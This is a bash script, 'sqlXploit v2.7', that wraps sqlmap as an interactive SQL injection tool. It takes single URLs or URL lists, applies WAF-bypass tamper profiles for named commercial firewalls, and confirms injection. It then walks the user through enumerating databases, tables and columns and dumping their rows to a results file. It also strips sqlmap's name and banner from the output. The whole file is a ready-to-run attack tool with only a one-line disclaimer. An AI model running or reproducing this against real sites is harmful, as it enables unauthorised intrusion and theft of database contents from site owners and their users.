#!/usr/bin/env bash
# sqlXploit v2.7 — Interactive wrapper around sqlmap
# Features: Interactive DB→Tables→Columns→Dump, WAF bypass, crawl/level/risk,
# endpoint filtering, clean output logging, banner replacement.

set -euo pipefail

# ---------- Colors ----------
BLUE='\033[1;34m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; RED='\033[1;31m'; CYAN='\033[1;36m'; NC='\033[0m'

# ---------- Banner ----------
banner() {
clear
cat << "EOF"
   ██████╗ ██████╗ ██╗     ██╗  ██╗██╗  ██╗██╗     ██╗██████╗ 
  ██╔════╝██╔═══██╗██║     ██║ ██╔╝██║  ██║██║     ██║██╔══██╗
  ██║     ██║   ██║██║     █████╔╝ ███████║██║     ██║██║  ██║
  ██║     ██║   ██║██║     ██╔═██╗ ██╔══██║██║     ██║██║  ██║
  ╚██████╗╚██████╔╝███████╗██║  ██╗██║  ██║███████╗██║██████╔╝
   ╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝╚═════╝ 
                           🚀 sqlXploit v2.7 🚀
================================================================
EOF

# Extra details
echo -e "${CYAN}                        Tool Version: v2.7${NC}"
echo -e "${GREEN}                        Developed by: TehanG07${NC}"
echo -e "${YELLOW}                        Website: www.cyberi.in${NC}"
echo -e "================================================================"
}

banner

# ---------- Disclaimer ----------
echo -e "${RED}[!] Legal disclaimer:${NC} Usage of ${CYAN}sqlXploit${NC} without consent is illegal."
echo -e "    End user is responsible for compliance with laws."
echo -e "================================================================"

# ---------- Utility ----------
read_choice () { local prompt="$1"; local var; read -rp "$prompt" var; echo "${var:-}"; }

# ---------- Extension Filters ----------
STATIC_EXCL_REGEX='\.(js|json|css|png|jpg|jpeg|gif|svg|ico|webp|avif|woff2?|ttf|otf|mp4|webm|mp3|wav|avi|mov|zip|rar|7z|tar|gz|bz2|br|map)(\?|$)'
AGGR_EXCL_REGEX='\.(js|json|css|png|jpg|jpeg|gif|svg|ico|webp|avif|woff2?|ttf|otf|mp4|webm|mp3|wav|avi|mov|zip|rar|7z|tar|gz|bz2|br|map|html?|php|aspx?|jsp|cfm|xml|txt|pdf)(\?|$)'

# ---------- Inputs ----------
echo -e "\nChoose input type:\n1) URL file path\n2) Single URL"
mode=$(read_choice "> [Enter 1 or 2]: ")

input_url=""
targets_file=""
case "$mode" in
  1)
    fp=$(read_choice "Enter URL file path: ")
    [[ -f "$fp" ]] || { echo -e "${RED}File not found.${NC}"; exit 1; }
    echo -e "\nEndpoint filtering mode:\n1) Static-only\n2) Aggressive"
    fmode=$(read_choice "> [Enter 1 or 2]: ")
    tmp_targets="$(mktemp)"
    if [[ "$fmode" == "2" ]]; then
      grep -Eiv "$AGGR_EXCL_REGEX" "$fp" | sed '/^\s*$/d' > "$tmp_targets"
    else
      grep -Eiv "$STATIC_EXCL_REGEX" "$fp" | sed '/^\s*$/d' > "$tmp_targets"
    fi
    [[ -s "$tmp_targets" ]] || { echo -e "${RED}No targets left.${NC}"; exit 1; }
    targets_file="$tmp_targets"
    ;;
  2)
    input_url=$(read_choice "Enter single URL: ")
    [[ -n "$input_url" ]] || { echo -e "${RED}URL required.${NC}"; exit 1; }
    ;;
  *) echo -e "${RED}Invalid choice.${NC}"; exit 1;;
esac

# ---------- WAF / Tamper ----------
tamper=""
wafq=$(read_choice $'\nApply WAF bypass? (Y/N): ')
if [[ "$wafq" =~ ^[Yy]$ ]]; then
  echo -e "Choose WAF:\n1) Cloudflare\n2) Akamai\n3) AWS WAF\n4) Imperva\n5) ModSecurity"
  wafc=$(read_choice "> ")
  case "$wafc" in
    1|2|3) tamper="space2comment,randomcase,between" ;;
    4) tamper="space2comment,randomcase,charunicodeencode" ;;
    5) tamper="modsecurityversioned,modsecurityzeroversion,space2comment,randomcase" ;;
    *) tamper="space2comment,randomcase,between" ;;
  esac
fi

# ---------- Crawl ----------
crawl_opt=""
cq=$(read_choice $'\nEnable crawling? (Y/N): ')
if [[ "$cq" =~ ^[Yy]$ ]]; then
  cl=$(read_choice "Enter crawl level (1-4): ")
  [[ "$cl" =~ ^[1-4]$ ]] || { echo -e "${RED}Invalid level.${NC}"; exit 1; }
  crawl_opt="--crawl=$cl --forms"
fi

# ---------- Level ----------
level_opt=""
lq=$(read_choice $'\nSet injection LEVEL? (Y/N): ')
if [[ "$lq" =~ ^[Yy]$ ]]; then
  lvl=$(read_choice "Enter level (1-5): ")
  [[ "$lvl" =~ ^[1-5]$ ]] || { echo -e "${RED}Invalid level.${NC}"; exit 1; }
  level_opt="--level=$lvl"
fi

# ---------- Risk ----------
risk_opt=""
rq=$(read_choice $'\nSet RISK level? (Y/N): ')
if [[ "$rq" =~ ^[Yy]$ ]]; then
  rk=$(read_choice "Enter risk (1-3): ")
  [[ "$rk" =~ ^[1-3]$ ]] || { echo -e "${RED}Invalid risk.${NC}"; exit 1; }
  risk_opt="--risk=$rk"
fi

# ---------- Assemble Options ----------
common_opts=( --smart --threads=5 --timeout=15 --retries=1 --random-agent --fresh-queries --disable-coloring )
[[ -n "$tamper" ]] && common_opts+=( --tamper="$tamper" )
[[ -n "$crawl_opt" ]] && common_opts+=( $crawl_opt )
[[ -n "$level_opt" ]] && common_opts+=( $level_opt )
[[ -n "$risk_opt" ]] && common_opts+=( $risk_opt )

# ---------- Sanitizer ----------
SANITIZE_CMD="sed -u \
  -e 's/sqlmap/sqlXploit/Ig' \
  -e '/^        ___/d;/^       __H__/d;/^ ___ ___/d;/^|_ -|/d;/^|___|/d;/^      |_|/d' \
  -e '/https:\/\/sqlXploit.org/d'"

out="results.txt"
: > "$out"

# ---------- Core Scan ----------
scan_target () {
  local url=$1
  echo -e "\n${CYAN}>>> Target: $url ${NC}\n"
  echo "==========================" >> "$out"
  echo "sqlXploit v2.7" >> "$out"
  echo "Target: $url" >> "$out"

  echo -e "${YELLOW}[*] Checking injection...${NC}"
  if ! sqlmap -u "$url" "${common_opts[@]}" --batch 2>&1 | grep -qi "DBMS"; then
    echo -e "${RED}[-] No injection.${NC}"
    echo "No injection found." >> "$out"
    return
  fi
  echo -e "${GREEN}[+] Injection confirmed!${NC}"

  # Step 1: Databases
  ans=$(read_choice "Enumerate databases? (Y/N): ")
  if [[ "$ans" =~ ^[Yy]$ ]]; then
    sqlmap -u "$url" "${common_opts[@]}" --dbs 2>&1 | eval "$SANITIZE_CMD" | tee -a "$out"
    db=$(read_choice "Enter database name: ")
    [[ -z "$db" ]] && return

    # Step 2: Tables
    ans=$(read_choice "Enumerate tables in [$db]? (Y/N): ")
    if [[ "$ans" =~ ^[Yy]$ ]]; then
      sqlmap -u "$url" "${common_opts[@]}" -D "$db" --tables 2>&1 | eval "$SANITIZE_CMD" | tee -a "$out"
      tb=$(read_choice "Enter table name: ")
      [[ -z "$tb" ]] && return

      # Step 3: Columns
      ans=$(read_choice "Enumerate columns in [$db.$tb]? (Y/N): ")
      if [[ "$ans" =~ ^[Yy]$ ]]; then
        sqlmap -u "$url" "${common_opts[@]}" -D "$db" -T "$tb" --columns 2>&1 | eval "$SANITIZE_CMD" | tee -a "$out"
        cols=$(read_choice "Enter column(s) (comma separated or * for all): ")
        [[ -z "$cols" ]] && return

        # Step 4: Dump
        echo -e "${GREEN}[+] Dumping rows from $db.$tb...${NC}"
        if [[ "$cols" == "*" ]]; then
          sqlmap -u "$url" "${common_opts[@]}" -D "$db" -T "$tb" --dump 2>&1 | eval "$SANITIZE_CMD" | tee -a "$out"
        else
          sqlmap -u "$url" "${common_opts[@]}" -D "$db" -T "$tb" -C "$cols" --dump 2>&1 | eval "$SANITIZE_CMD" | tee -a "$out"
        fi
      fi
    fi
  fi

  echo -e "==========================\n" >> "$out"
}

# ---------- Run ----------
echo -e "\n${BLUE}🔥 Starting scans...${NC}"
echo -e "Output will be saved in: ${GREEN}$out${NC}\n"

if [[ -n "${targets_file:-}" ]]; then
  while IFS= read -r target; do
    [[ -z "$target" ]] && continue
    scan_target "$target"
  done < "$targets_file"
else
  scan_target "$input_url"
fi

banner
echo -e "\n${GREEN}Done.${NC} Review ${YELLOW}$out${NC}"
